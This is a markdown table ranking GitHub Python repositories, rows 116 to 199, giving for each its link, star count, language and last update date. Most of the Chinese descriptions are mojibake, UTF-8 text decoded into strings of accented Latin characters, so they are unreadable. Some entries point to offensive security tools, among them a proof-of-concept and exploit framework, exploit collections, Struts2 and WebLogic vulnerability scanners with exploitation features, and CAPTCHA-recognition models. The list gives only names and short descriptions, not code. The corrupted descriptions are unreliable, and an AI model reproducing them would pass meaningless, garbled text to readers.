|116|[521xueweihan/GitHub520](https://github.com/521xueweihan/GitHub520)|:kissing_heart:ËÆ©‰Ω†‚ÄúÁà±‚Äù‰∏ä GitHubÔºåËß£ÂÜ≥ËÆøÈóÆÊó∂ÂõæË£Ç„ÄÅÂä†ËΩΩÊÖ¢ÁöÑÈóÆÈ¢ò„ÄÇ|1.8k|Python|10/30|
|117|[huangrt01/CS-Notes](https://github.com/huangrt01/CS-Notes)|ÊàëÁöÑËá™Â≠¶Á¨îËÆ∞ÔºåÂú®Â≠¶‰π†ML SystemÔºåÊï¥ÁêÜC++„ÄÅÁÆóÊ≥ï„ÄÅÊìç‰ΩúÁ≥ªÁªüÔºåÂêéÁª≠Â≠¶‰π†ÂàÜÂ∏ÉÂºèÁ≥ªÁªüÔºåÁªàË∫´Êõ¥Êñ∞„ÄÇ|1.8k|Python|10/28|
|118|[PaddlePaddle/PaddleHub](https://github.com/PaddlePaddle/PaddleHub)|Toolkit for Pre-trained Model Application of PaddlePaddleÔºà„ÄéÈ£ûÊ°®„ÄèÈ¢ÑËÆ≠ÁªÉÊ®°ÂûãÂ∫îÁî®Â∑•ÂÖ∑ Ôºâ|1.8k|Python|10/30|
|119|[newpanjing/simpleui](https://github.com/newpanjing/simpleui)|A modern theme based on vue+element-ui for django admin.‰∏ÄÊ¨æÂü∫‰∫évue+element-uiÁöÑdjango adminÁé∞‰ª£Âåñ‰∏ªÈ¢ò„ÄÇÂÖ®ÁêÉ10000+ÁΩëÁ´ôÈÉΩÂú®‰ΩøÁî®ÔºÅÂñúÊ¨¢ÂèØ‰ª•ÁÇπ‰∏™star‚ú®|1.8k|Python|10/20|
|120|[ownthink/Jiagu](https://github.com/ownthink/Jiagu)|JiaguÊ∑±Â∫¶Â≠¶‰π†Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂ∑•ÂÖ∑  Áü•ËØÜÂõæË∞±ÂÖ≥Á≥ªÊäΩÂèñ ‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ÊÉÖÊÑüÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØç ÊñáÊú¨ÊëòË¶Å ÊñáÊú¨ËÅöÁ±ª|1.8k|Python|10/21|
|121|[nickliqian/cnn_captcha](https://github.com/nickliqian/cnn_captcha)|use cnn recognize captcha by tensorflow. Êú¨È°πÁõÆÈíàÂØπÂ≠óÁ¨¶ÂûãÂõæÁâáÈ™åËØÅÁ†ÅÔºå‰ΩøÁî®tensorflowÂÆûÁé∞Âç∑ÁßØÁ•ûÁªèÁΩëÁªúÔºåËøõË°åÈ™åËØÅÁ†ÅËØÜÂà´„ÄÇ|1.7k|Python|09/26|
|122|[PegasusWang/python_data_structures_and_algorithms](https://github.com/PegasusWang/python_data_structures_and_algorithms)|Python ‰∏≠ÊñáÊï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ïÊïôÁ®ã|1.7k|Python|06/15|
|123|[BlankerL/DXY-COVID-19-Crawler](https://github.com/BlankerL/DXY-COVID-19-Crawler)|2019Êñ∞ÂûãÂÜ†Áä∂ÁóÖÊØíÁñ´ÊÉÖÂÆûÊó∂Áà¨Ëô´ÂèäAPI   COVID-19/2019-nCoV Realtime Infection Crawler and API|1.7k|Python|04/10|
|124|[649453932/Chinese-Text-Classification-Pytorch](https://github.com/649453932/Chinese-Text-Classification-Pytorch)|‰∏≠ÊñáÊñáÊú¨ÂàÜÁ±ªÔºåTextCNNÔºåTextRNNÔºåFastTextÔºåTextRCNNÔºåBiLSTM_AttentionÔºåDPCNNÔºåTransformerÔºåÂü∫‰∫épytorchÔºåÂºÄÁÆ±Âç≥Áî®„ÄÇ|1.7k|Python|09/23|
|125|[kingname/GeneralNewsExtractor](https://github.com/kingname/GeneralNewsExtractor)| Êñ∞ÈóªÁΩëÈ°µÊ≠£ÊñáÈÄöÁî®ÊäΩÂèñÂô® Beta Áâà.|1.7k|Python|10/06|
|126|[china-testing/python-api-tesing](https://github.com/china-testing/python-api-tesing)|python‰∏≠ÊñáÂ∫ì-python‰∫∫Â∑•Êô∫ËÉΩÂ§ßÊï∞ÊçÆËá™Âä®ÂåñÊé•Âè£ÊµãËØïÂºÄÂèë„ÄÇ ‰π¶Á±ç‰∏ãËΩΩÂèäpythonÂ∫ìÊ±áÊÄªhttps://china-testing.github.io/  |1.7k|Python|10/25|
|127|[wbt5/real-url](https://github.com/wbt5/real-url)|Ëé∑ÂèñÊñóÈ±º&ËôéÁâô&ÂìîÂì©ÂìîÂì©&ÊäñÈü≥&Âø´ÊâãÁ≠â 48 ‰∏™Áõ¥Êí≠Âπ≥Âè∞ÁöÑÁúüÂÆûÊµÅÂ™í‰ΩìÂú∞ÂùÄ(Áõ¥Êí≠Ê∫ê)ÂíåÂºπÂπïÔºåÁõ¥Êí≠Ê∫êÂèØÂú® PotPlayer„ÄÅflv.js Á≠âÊí≠ÊîæÂô®‰∏≠Êí≠Êîæ„ÄÇ|1.7k|Python|10/17|
|128|[awolfly9/IPProxyTool](https://github.com/awolfly9/IPProxyTool)|python ip proxy tool  scrapy crawl. ÊäìÂèñÂ§ßÈáèÂÖçË¥π‰ª£ÁêÜ ipÔºåÊèêÂèñÊúâÊïà ip ‰ΩøÁî®|1.7k|Python|10/28|
|129|[crownpku/Information-Extraction-Chinese](https://github.com/crownpku/Information-Extraction-Chinese)|Chinese Named Entity Recognition with IDCNN/biLSTM+CRF, and Relation Extraction with biGRU+2ATT ‰∏≠ÊñáÂÆû‰ΩìËØÜÂà´‰∏éÂÖ≥Á≥ªÊèêÂèñ|1.7k|Python|03/29|
|130|[InsaneLife/ChineseNLPCorpus](https://github.com/InsaneLife/ChineseNLPCorpus)|‰∏≠ÊñáËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÊï∞ÊçÆÈõÜÔºåÂπ≥Êó∂ÂÅöÂÅöÂÆûÈ™åÁöÑÊùêÊñô„ÄÇÊ¨¢ËøéË°•ÂÖÖÊèê‰∫§ÂêàÂπ∂„ÄÇ|1.7k|Python|10/16|
|131|[shinnytech/tqsdk-python](https://github.com/shinnytech/tqsdk-python)|Â§©Âã§ÈáèÂåñÂºÄÂèëÂåÖ, ÊúüË¥ßÈáèÂåñ, ÂÆûÊó∂Ë°åÊÉÖ/ÂéÜÂè≤Êï∞ÊçÆ/ÂÆûÁõò‰∫§Êòì|1.6k|Python|09/11|
|132|[FeeiCN/GSIL](https://github.com/FeeiCN/GSIL)|GitHub Sensitive Information LeakageÔºàGitHubÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÁõëÊéßÔºâ|1.6k|Python|08/21|
|133|[toolgood/ToolGood.Words](https://github.com/toolgood/ToolGood.Words)|‰∏ÄÊ¨æÈ´òÊÄßËÉΩÊïèÊÑüËØç(ÈùûÊ≥ïËØç/ËÑèÂ≠ó)Ê£ÄÊµãËøáÊª§ÁªÑ‰ª∂ÔºåÈôÑÂ∏¶ÁπÅ‰ΩìÁÆÄ‰Ωì‰∫íÊç¢ÔºåÊîØÊåÅÂÖ®ËßíÂçäËßí‰∫íÊç¢ÔºåÊ±âÂ≠óËΩ¨ÊãºÈü≥ÔºåÊ®°Á≥äÊêúÁ¥¢Á≠âÂäüËÉΩ„ÄÇ|1.5k|Python|10/26|
|134|[zhanyong-wan/dongbei](https://github.com/zhanyong-wan/dongbei)|‰∏úÂåóÊñπË®ÄÁºñÁ®ãËØ≠Ë®Ä|1.5k|Python|09/18|
|135|[Xyntax/POC-T](https://github.com/Xyntax/POC-T)|Ê∏óÈÄèÊµãËØïÊèí‰ª∂ÂåñÂπ∂ÂèëÊ°ÜÊû∂ / Open-sourced remote vulnerability PoC/EXP framework|1.5k|Python|10/01|
|136|[guanguans/favorite-link](https://github.com/guanguans/favorite-link)|‚ù§Ô∏è ÊØèÊó•Êî∂ÈõÜÂñúÊ¨¢ÁöÑÂºÄÊ∫êÈ°πÁõÆ   RSS ËÆ¢ÈòÖ    Âø´Áü• app ËÆ¢ÈòÖ|1.5k|Python|10/29|
|137|[candlewill/Dialog_Corpus](https://github.com/candlewill/Dialog_Corpus)|Áî®‰∫éËÆ≠ÁªÉ‰∏≠Ëã±ÊñáÂØπËØùÁ≥ªÁªüÁöÑËØ≠ÊñôÂ∫ì Datasets for Training Chatbot System|1.5k|Python|09/24|
|138|[NewFuture/DDNS](https://github.com/NewFuture/DDNS)|:triangular_flag_on_post: Ëá™Âä®Êõ¥Êñ∞ÂüüÂêçËß£ÊûêÂà∞Êú¨Êú∫IP(ÊîØÊåÅdnspod,ÈòøÈáåDNS,CloudFlare,Âçé‰∏∫‰∫ë,DNSCOM...)|1.5k|Python|10/16|
|139|[Henryhaohao/Bilibili_video_download](https://github.com/Henryhaohao/Bilibili_video_download)|:rainbow:Bilibili_video_download-BÁ´ôËßÜÈ¢ë‰∏ãËΩΩ|1.5k|Python|04/03|
|140|[xianhu/PSpider](https://github.com/xianhu/PSpider)|ÁÆÄÂçïÊòìÁî®ÁöÑPythonÁà¨Ëô´Ê°ÜÊû∂ÔºåQQ‰∫§ÊµÅÁæ§Ôºö597510560|1.5k|Python|03/03|
|141|[kerlomz/captcha_trainer](https://github.com/kerlomz/captcha_trainer)|[È™åËØÅÁ†ÅËØÜÂà´-ËÆ≠ÁªÉ] This project is based on CNN/ResNet/DenseNet+GRU/LSTM+CTC/CrossEntropy to realize verification code identification. This project is only for training the model.|1.5k|Python|09/26|
|142|[wkunzhi/Python3-Spider](https://github.com/wkunzhi/Python3-Spider)|PythonÁà¨Ëô´ÂÆûÊàò - Ê®°ÊãüÁôªÈôÜÂêÑÂ§ßÁΩëÁ´ô ÂåÖÂê´‰ΩÜ‰∏çÈôê‰∫éÔºöÊªëÂùóÈ™åËØÅ„ÄÅÊãºÂ§öÂ§ö„ÄÅÁæéÂõ¢„ÄÅÁôæÂ∫¶„ÄÅbilibili„ÄÅÂ§ß‰ºóÁÇπËØÑ„ÄÅÊ∑òÂÆùÔºåÂ¶ÇÊûúÂñúÊ¨¢ËØ∑start ‚ù§Ô∏è|1.4k|Python|07/24|
|143|[brightmart/roberta_zh](https://github.com/brightmart/roberta_zh)|RoBERTa‰∏≠ÊñáÈ¢ÑËÆ≠ÁªÉÊ®°Âûã: RoBERTa for Chinese |1.4k|Python|06/29|
|144|[youyuge34/PI-REC](https://github.com/youyuge34/PI-REC)|:fire: PI-REC: Progressive Image Reconstruction Network With Edge and Color Domain. :fire: ÂõæÂÉèÁøªËØëÔºåÊù°‰ª∂GANÔºåAIÁªòÁîª|1.4k|Python|08/21|
|145|[abbeyokgo/PyOne](https://github.com/abbeyokgo/PyOne)|PyOne-‰∏ÄÊ¨æÁªôÂäõÁöÑonedriveÊñá‰ª∂ÁÆ°ÁêÜ„ÄÅÂàÜ‰∫´Á®ãÂ∫è|1.4k|Python|03/14|
|146|[doraemonext/wechat-python-sdk](https://github.com/doraemonext/wechat-python-sdk)|ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞ Python ÂºÄÂèëÂåÖ [DEPRECATED]|1.4k|Python|10/01|
|147|[LyleMi/Learn-Web-Hacking](https://github.com/LyleMi/Learn-Web-Hacking)|Study Notes For Web Hacking / WebÂÆâÂÖ®Â≠¶‰π†Á¨îËÆ∞|1.4k|Python|10/25|
|148|[CLUEbenchmark/CLUE](https://github.com/CLUEbenchmark/CLUE)|‰∏≠ÊñáËØ≠Ë®ÄÁêÜËß£Âü∫ÂáÜÊµãËØÑ Chinese Language Understanding Evaluation Benchmark: datasets, baselines, pre-trained models, corpus and leaderboard  |1.3k|Python|10/27|
|149|[littlecodersh/itchatmp](https://github.com/littlecodersh/itchatmp)|A complete and graceful API for wechat mp. ÂÆåÂ§á‰ºòÈõÖÁöÑÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Êé•Âè£ÔºåÂéüÁîüÊîØÊåÅÂêåÊ≠•„ÄÅÂçèÁ®ã‰ΩøÁî®„ÄÇ |1.3k|Python|04/24|
|150|[duoergun0729/nlp](https://github.com/duoergun0729/nlp)|ÂÖúÂì•Âá∫ÂìÅ <‰∏ÄÊú¨ÂºÄÊ∫êÁöÑNLPÂÖ•Èó®‰π¶Á±ç>|1.3k|Python|02/11|
|151|[coffeehb/Some-PoC-oR-ExP](https://github.com/coffeehb/Some-PoC-oR-ExP)|ÂêÑÁßçÊºèÊ¥ûpoc„ÄÅExpÁöÑÊî∂ÈõÜÊàñÁºñÂÜô|1.3k|Python|07/14|
|152|[howie6879/ruia](https://github.com/howie6879/ruia)|Async Python 3.6+ web scraping micro-framework based on asyncioÔºàPython3.6+ÂºÇÊ≠•Áà¨Ëô´Ê°ÜÊû∂Ôºâ|1.3k|Python|10/21|
|153|[cn/GB2260](https://github.com/cn/GB2260)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÂõΩÂÆ∂Ê†áÂáÜ GB/T 2260 Ë°åÊîøÂå∫Âàí‰ª£Á†Å|1.3k|Python|05/18|
|154|[PyJun/Mooc_Downloader](https://github.com/PyJun/Mooc_Downloader)|Â≠¶Êó†Ê≠¢‰∏ãËΩΩÂô®ÔºåÊÖïËØæ‰∏ãËΩΩÂô®ÔºåMooc‰∏ãËΩΩÔºåÊÖïËØæÁΩë‰∏ãËΩΩÔºå‰∏≠ÂõΩÂ§ßÂ≠¶‰∏ãËΩΩÔºåÁà±ËØæÁ®ã‰∏ãËΩΩÔºåÁΩëÊòì‰∫ëËØæÂ†Ç‰∏ãËΩΩÔºåÂ≠¶Â†ÇÂú®Á∫ø‰∏ãËΩΩÔºåË∂ÖÊòüÂ≠¶‰π†ÈÄö‰∏ãËΩΩÔºõÊîØÊåÅËßÜÈ¢ëÔºåËØæ‰ª∂ÂêåÊó∂‰∏ãËΩΩ|1.3k|Python|08/21|
|155|[iswbm/magic-python](https://github.com/iswbm/magic-python)|Python ÈªëÈ≠îÊ≥ïÊâãÂÜå|1.3k|Python|10/11|
|156|[QuantFans/quantdigger](https://github.com/QuantFans/quantdigger)|Âü∫‰∫épythonÁöÑÈáèÂåñ‰∫§ÊòìÂπ≥Âè∞|1.2k|Python|05/02|
|157|[EugeneLiu/translationCSAPP](https://github.com/EugeneLiu/translationCSAPP)|‰∏∫ CSAPP ËßÜÈ¢ëËØæÁ®ãÊèê‰æõÂ≠óÂπïÔºåÁøªËØë PPTÔºåLab„ÄÇ|1.2k|Python|08/17|
|158|[michaelliao/sinaweibopy](https://github.com/michaelliao/sinaweibopy)|Êñ∞Êµ™ÂæÆÂçöPython SDK|1.2k|Python|09/27|
|159|[fendouai/PyTorchDocs](https://github.com/fendouai/PyTorchDocs)|PyTorch ÂÆòÊñπ‰∏≠ÊñáÊïôÁ®ãÂåÖÂê´ 60 ÂàÜÈíüÂø´ÈÄüÂÖ•Èó®ÊïôÁ®ãÔºåÂº∫ÂåñÊïôÁ®ãÔºåËÆ°ÁÆóÊú∫ËßÜËßâÔºåËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÔºåÁîüÊàêÂØπÊäóÁΩëÁªúÔºåÂº∫ÂåñÂ≠¶‰π†„ÄÇÊ¨¢Ëøé StarÔºåForkÔºÅ|1.2k|Python|10/27|
|160|[zq1997/deepin-wine](https://github.com/zq1997/deepin-wine)|„ÄêdeepinÊ∫êÁßªÊ§ç„ÄëDebian/Ubuntu‰∏äÊúÄÂø´ÁöÑQQ/ÂæÆ‰ø°ÂÆâË£ÖÊñπÂºè|1.1k|Python|09/16|
|161|[out0fmemory/GoAgent-Always-Available](https://github.com/out0fmemory/GoAgent-Always-Available)|‰∏ÄÁõ¥ÂèØÁî®ÁöÑGoAgentÔºå‰ºöÂÆöÊó∂Êâ´ÊèèÂèØÁî®ÁöÑgoogle gae ipÔºåÊèê‰æõÂèØËá™Âä®ÂåñËé∑ÂèñipËøêË°åÁöÑÁâàÊú¨|1.1k|Python|05/29|
|162|[DA-southampton/NLP_ability](https://github.com/DA-southampton/NLP_ability)|ÊÄªÁªìÊ¢≥ÁêÜËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂ∑•Á®ãÂ∏à(NLP)ÈúÄË¶ÅÁßØÁ¥ØÁöÑÂêÑÊñπÈù¢Áü•ËØÜÔºåÂåÖÊã¨Èù¢ËØïÈ¢òÔºåÂêÑÁßçÂü∫Á°ÄÁü•ËØÜÔºåÂ∑•Á®ãËÉΩÂäõÁ≠âÁ≠âÔºåÊèêÂçáÊ†∏ÂøÉÁ´û‰∫âÂäõ|1.1k|Python|10/28|
|163|[EssayKillerBrain/EssayKiller_V2](https://github.com/EssayKillerBrain/EssayKiller_V2)|Âü∫‰∫éÂºÄÊ∫êGPT2.0ÁöÑÂàù‰ª£Âàõ‰ΩúÂûã‰∫∫Â∑•Êô∫ËÉΩ   ÂèØÊâ©Â±ï„ÄÅÂèØËøõÂåñ|1.1k|Python|10/26|
|164|[ymcui/Chinese-XLNet](https://github.com/ymcui/Chinese-XLNet)|Pre-Trained Chinese XLNetÔºà‰∏≠ÊñáXLNetÈ¢ÑËÆ≠ÁªÉÊ®°ÂûãÔºâ|1.1k|Python|10/20|
|165|[CLUEbenchmark/CLUEDatasetSearch](https://github.com/CLUEbenchmark/CLUEDatasetSearch)|ÊêúÁ¥¢ÊâÄÊúâ‰∏≠ÊñáNLPÊï∞ÊçÆÈõÜÔºåÈôÑÂ∏∏Áî®Ëã±ÊñáNLPÊï∞ÊçÆÈõÜ|1.1k|Python|03/01|
|166|[zwczou/weixin-python](https://github.com/zwczou/weixin-python)|ÂæÆ‰ø°SDK - ÂåÖÊã¨ÂæÆ‰ø°ÊîØ‰ªò,ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑,ÂæÆ‰ø°ÁôªÈôÜ,ÂæÆ‰ø°Ê∂àÊÅØÂ§ÑÁêÜÁ≠â|1.1k|Python|07/06|
|167|[dixudx/tumblr-crawler](https://github.com/dixudx/tumblr-crawler)|Easily download all the photos/videos from tumblr blogs. ‰∏ãËΩΩÊåáÂÆöÁöÑ Tumblr ÂçöÂÆ¢‰∏≠ÁöÑÂõæÁâáÔºåËßÜÈ¢ë|1.1k|Python|05/02|
|168|[nobody132/masr](https://github.com/nobody132/masr)|‰∏≠ÊñáËØ≠Èü≥ËØÜÂà´; Mandarin Automatic Speech Recognition;|1.1k|Python|05/18|
|169|[TheThreeDog/Auto-Lianliankan](https://github.com/TheThreeDog/Auto-Lianliankan)|Âü∫‰∫épythonÂõæÂÉèËØÜÂà´ÂÆûÁé∞ÁöÑËøûËøûÁúãÂ§ñÊåÇÔºåÂèØÂÆûÁé∞QQËøûËøûÁúãÁßíÁ†¥|1.1k|Python|10/14|
|170|[seisman/how-to-write-makefile](https://github.com/seisman/how-to-write-makefile)|Ë∑üÊàë‰∏ÄËµ∑ÂÜôMakefileÈáçÂà∂Áâà|1.1k|Python|10/06|
|171|[Hsury/BiliDrive](https://github.com/Hsury/BiliDrive)|‚òÅÔ∏è ÂìîÂì©‰∫ëÔºå‰∏çÊîØÊåÅ‰ªªÊÑèÊñá‰ª∂ÁöÑÂÖ®ÈÄü‰∏ä‰º†‰∏é‰∏ãËΩΩ|1.1k|Python|03/20|
|172|[crownpku/Rasa_NLU_Chi](https://github.com/crownpku/Rasa_NLU_Chi)|Turn Chinese natural language into structured data ‰∏≠ÊñáËá™ÁÑ∂ËØ≠Ë®ÄÁêÜËß£|1.1k|Python|09/26|
|173|[jimmy201602/webterminal](https://github.com/jimmy201602/webterminal)|ssh rdp vnc telnet sftp bastion/jump web putty xshell terminal jumpserver audit realtime monitor rz/sz Â†°ÂûíÊú∫ ‰∫ëÊ°åÈù¢ linux devops sftp websocket  file management rz/sz otp Ëá™Âä®ÂåñËøêÁª¥ ÂÆ°ËÆ° ÂΩïÂÉè Êñá‰ª∂ÁÆ°ÁêÜ sftp‰∏ä‰º† ÂÆûÊó∂ÁõëÊéß ÂΩïÂÉèÂõûÊîæ ÁΩëÈ°µÁâàrz/sz‰∏ä‰º†‰∏ãËΩΩ/Âä®ÊÄÅÂè£‰ª§ django|1.1k|Python|10/28|
|174|[rabbitmask/WeblogicScan](https://github.com/rabbitmask/WeblogicScan)|Weblogic‰∏ÄÈîÆÊºèÊ¥ûÊ£ÄÊµãÂ∑•ÂÖ∑ÔºåV1.5ÔºåÊõ¥Êñ∞Êó∂Èó¥Ôºö20200730|1.0k|Python|08/25|
|175|[Acmesec/CTFCrackTools](https://github.com/Acmesec/CTFCrackTools)|China's first CTFTools framework.‰∏≠ÂõΩÂõΩÂÜÖÈ¶ñ‰∏™CTFÂ∑•ÂÖ∑Ê°ÜÊû∂,Êó®Âú®Â∏ÆÂä©CTFerÂø´ÈÄüÊîªÂÖãÈöæÂÖ≥|1.0k|Python|04/11|
|176|[sczhengyabin/Image-Downloader](https://github.com/sczhengyabin/Image-Downloader)|Download images from Google, Bing, Baidu. Ë∞∑Ê≠å„ÄÅÁôæÂ∫¶„ÄÅÂøÖÂ∫îÂõæÁâá‰∏ãËΩΩ.|1.0k|Python|10/06|
|177|[grayddq/GScan](https://github.com/grayddq/GScan)|Êú¨Á®ãÂ∫èÊó®Âú®‰∏∫ÂÆâÂÖ®Â∫îÊÄ•ÂìçÂ∫î‰∫∫ÂëòÂØπLinux‰∏ªÊú∫ÊéíÊü•Êó∂Êèê‰æõ‰æøÂà©ÔºåÂÆûÁé∞‰∏ªÊú∫‰æßChecklistÁöÑËá™Âä®ÂÖ®Èù¢ÂåñÊ£ÄÊµãÔºåÊ†πÊçÆÊ£ÄÊµãÁªìÊûúËá™Âä®Êï∞ÊçÆËÅöÂêàÔºåËøõË°åÈªëÂÆ¢ÊîªÂáªË∑ØÂæÑÊ∫ØÊ∫ê„ÄÇ|1.0k|Python|04/10|
|178|[nonebot/nonebot](https://github.com/nonebot/nonebot)|Âü∫‰∫é CQHTTP ÁöÑ Python ÂºÇÊ≠• QQ Êú∫Âô®‰∫∫Ê°ÜÊû∂|1.0k|Python|10/11|
|179|[lemonhu/stock-knowledge-graph](https://github.com/lemonhu/stock-knowledge-graph)|Âà©Áî®ÁΩëÁªú‰∏äÂÖ¨ÂºÄÁöÑÊï∞ÊçÆÊûÑÂª∫‰∏Ä‰∏™Â∞èÂûãÁöÑËØÅÂà∏Áü•ËØÜÂõæË∞±/Áü•ËØÜÂ∫ì|997|Python|07/23|
|180|[songyouwei/ABSA-PyTorch](https://github.com/songyouwei/ABSA-PyTorch)|Aspect Based Sentiment Analysis, PyTorch Implementations.  Âü∫‰∫éÊñπÈù¢ÁöÑÊÉÖÊÑüÂàÜÊûêÔºå‰ΩøÁî®PyTorchÂÆûÁé∞„ÄÇ|994|Python|08/10|
|181|[githublitao/api_automation_test](https://github.com/githublitao/api_automation_test)|Êé•Âè£Ëá™Âä®ÂåñÊµãËØïÂπ≥Âè∞ÔºåÂ∑≤ÂÅúÊ≠¢Áª¥Êä§ÔºåÁúãÂøÉÊÉÖÊîπÊîπ|992|Python|09/09|
|182|[r0ysue/AndroidSecurityStudy](https://github.com/r0ysue/AndroidSecurityStudy)|ÂÆâÂçìÂ∫îÁî®ÂÆâÂÖ®Â≠¶‰π†|991|Python|08/23|
|183|[FinMind/FinMind](https://github.com/FinMind/FinMind)|Open Data, more than 50 financial data. Êèê‰æõË∂ÖÈÅé 50 ÂÄãÈáëËûçË≥áÊñô(Âè∞ËÇ°ÁÇ∫‰∏ª)ÔºåÊØèÂ§©Êõ¥Êñ∞ https://finmind.github.io/|990|Python|10/08|
|184|[fzlee/alipay](https://github.com/fzlee/alipay)|Python Alipay(ÊîØ‰ªòÂÆù) SDK with SHA1/SHA256 support|986|Python|09/07|
|185|[blackholll/loonflow](https://github.com/blackholll/loonflow)|Âü∫‰∫édjangoÁöÑÂ∑•‰ΩúÊµÅÂºïÊìé,Â∑•Âçï(a workflow engine base on django python)|976|Python|10/28|
|186|[mai-lang-chai/Middleware-Vulnerability-detection](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection)|CVE„ÄÅCMS„ÄÅ‰∏≠Èó¥‰ª∂ÊºèÊ¥ûÊ£ÄÊµãÂà©Áî®ÂêàÈõÜ Since 2019-9-15|975|Python|10/19|
|187|[X-zhangyang/Real-World-Masked-Face-Dataset](https://github.com/X-zhangyang/Real-World-Masked-Face-Dataset)|Real-World Masked Face DatasetÔºåÂè£ÁΩ©‰∫∫ËÑ∏Êï∞ÊçÆÈõÜ|974|Python|09/16|
|188|[rainx/pytdx](https://github.com/rainx/pytdx)|Python tdxÊï∞ÊçÆÊé•Âè£|972|Python|04/15|
|189|[jachinlin/geektime_dl](https://github.com/jachinlin/geektime_dl)|ÊääÊûÅÂÆ¢Êó∂Èó¥Ë£ÖËøõ KindleÔºåÂÜÖÂê´Âø´ÊâãÂÜÖÊé®Á≠âÁ¶èÂà©|964|Python|06/02|
|190|[yangjianxin1/GPT2-chitchat](https://github.com/yangjianxin1/GPT2-chitchat)|GPT2 for Chinese chitchat/Áî®‰∫é‰∏≠ÊñáÈó≤ËÅäÁöÑGPT2Ê®°Âûã(ÂÆûÁé∞‰∫ÜDialoGPTÁöÑMMIÊÄùÊÉ≥)|961|Python|05/16|
|191|[hanbinglengyue/FART](https://github.com/hanbinglengyue/FART)|ARTÁéØÂ¢É‰∏ãËá™Âä®ÂåñËÑ±Â£≥ÊñπÊ°à|956|Python|07/31|
|192|[apachecn/python_data_analysis_and_mining_action](https://github.com/apachecn/python_data_analysis_and_mining_action)|„ÄäpythonÊï∞ÊçÆÂàÜÊûê‰∏éÊåñÊéòÂÆûÊàò„ÄãÁöÑ‰ª£Á†ÅÁ¨îËÆ∞|952|Python|08/02|
|193|[phodal/iot](https://github.com/phodal/iot)|IoT, ËøôÊòØ‰∏Ä‰∏™ÊúÄÂ∞èInternet of Things Ôºå‰∏Ä‰∏™Internet of ThingsÁõ∏ÂÖ≥ÁöÑÊØï‰∏öËÆæËÆ°‰∫ßÁîüÁöÑ‰∏Ä‰∏™ÁÆÄÂåñÁöÑÁâ©ËÅîÁΩëÁ≥ªÁªü„ÄÇ „ÄÇ|948|Python|04/21|
|194|[laixintao/python-parallel-programming-cookbook-cn](https://github.com/laixintao/python-parallel-programming-cookbook-cn)|üìñ„ÄäPython Parallel Programming Cookbook„Äã‰∏≠ÊñáÁâà|935|Python|09/24|
|195|[librauee/Reptile](https://github.com/librauee/Reptile)|üèÄ Python3 ÁΩëÁªúÁà¨Ëô´ÂÆûÊàòÔºàÈÉ®ÂàÜÂê´ËØ¶ÁªÜÊïôÁ®ãÔºâÁå´Áúº ËÖæËÆØËßÜÈ¢ë Ë±ÜÁì£ Á†îÊãõÁΩë ÂæÆÂçö Á¨îË∂£ÈòÅÂ∞èËØ¥ ÁôæÂ∫¶ÁÉ≠ÁÇπ BÁ´ô CSDN ÁΩëÊòì‰∫ëÈòÖËØª ÈòøÈáåÊñáÂ≠¶ ÁôæÂ∫¶ËÇ°Á•® ‰ªäÊó•Â§¥Êù° ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ ÁΩëÊòì‰∫ëÈü≥‰πê ÊãâÂãæ ÊúâÈÅì unsplash ÂÆû‰π†ÂÉß Ê±ΩËΩ¶‰πãÂÆ∂ Ëã±ÈõÑËÅîÁõüÁõíÂ≠ê Â§ß‰ºóÁÇπËØÑ ÈìæÂÆ∂ LPLËµõÁ®ã Âè∞È£é Ê¢¶ÂπªË•øÊ∏∏„ÄÅÈò¥Èò≥Â∏àËóèÂÆùÈòÅ Â§©Ê∞î ÁâõÂÆ¢ÁΩë ÁôæÂ∫¶ÊñáÂ∫ì Áù°ÂâçÊïÖ‰∫ã Áü•‰πé Wish|922|Python|07/31|
|196|[TophantTechnology/ARL](https://github.com/TophantTechnology/ARL)|ARL(Asset Reconnaissance Lighthouse)ËµÑ‰∫ß‰æ¶ÂØüÁÅØÂ°îÁ≥ªÁªüÊó®Âú®Âø´ÈÄü‰æ¶ÂØü‰∏éÁõÆÊ†áÂÖ≥ËÅîÁöÑ‰∫íËÅîÁΩëËµÑ‰∫ßÔºåÊûÑÂª∫Âü∫Á°ÄËµÑ‰∫ß‰ø°ÊÅØÂ∫ì„ÄÇ ÂçèÂä©Áî≤ÊñπÂÆâÂÖ®Âõ¢ÈòüÊàñËÄÖÊ∏óÈÄèÊµãËØï‰∫∫ÂëòÊúâÊïà‰æ¶ÂØüÂíåÊ£ÄÁ¥¢ËµÑ‰∫ßÔºåÂèëÁé∞Â≠òÂú®ÁöÑËñÑÂº±ÁÇπÂíåÊîªÂáªÈù¢„ÄÇ|912|Python|09/30|
|197|[snowkylin/TensorFlow-cn](https://github.com/snowkylin/TensorFlow-cn)|ÁÆÄÂçïÁ≤óÊö¥ TensorFlow (1.X)   A Concise Handbook of TensorFlow (1.X)   Ê≠§ÁâàÊú¨‰∏çÂÜçÊõ¥Êñ∞ÔºåÊñ∞ÁâàËßÅ https://tf.wiki|888|Python|04/28|
|198|[benitoro/stockholm](https://github.com/benitoro/stockholm)|‰∏Ä‰∏™ËÇ°Á•®Êï∞ÊçÆÔºàÊ≤™Ê∑±ÔºâÁà¨Ëô´ÂíåÈÄâËÇ°Á≠ñÁï•ÊµãËØïÊ°ÜÊû∂|888|Python|08/14|
|199|[HatBoy/Struts2-Scan](https://github.com/HatBoy/Struts2-Scan)|Struts2ÂÖ®ÊºèÊ¥ûÊâ´ÊèèÂà©Áî®Â∑•ÂÖ∑|885|Python|10/19|
